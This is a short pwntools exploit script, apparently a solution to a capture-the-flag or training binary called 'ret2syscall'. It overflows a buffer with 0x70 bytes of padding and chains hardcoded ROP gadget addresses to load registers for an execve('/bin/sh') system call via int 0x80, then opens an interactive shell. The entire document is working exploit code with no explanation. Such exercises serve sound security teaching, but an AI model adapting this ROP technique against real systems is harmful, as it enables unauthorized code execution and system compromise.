from pwn import *
sh = process("./ret2syscall")
int_80_addr = 0x08049421
binsh = 0x080be408
pop_eax_addr = 0x080bb196
pop_edx_ecx_ebx_addr = 0x0806eb90
payload = flat(["A" * 0x70, pop_edx_ecx_ebx_addr, 0, 0, binsh, pop_eax_addr, 0xb, int_80_addr])
sh.sendline(payload)
sh.interactive()
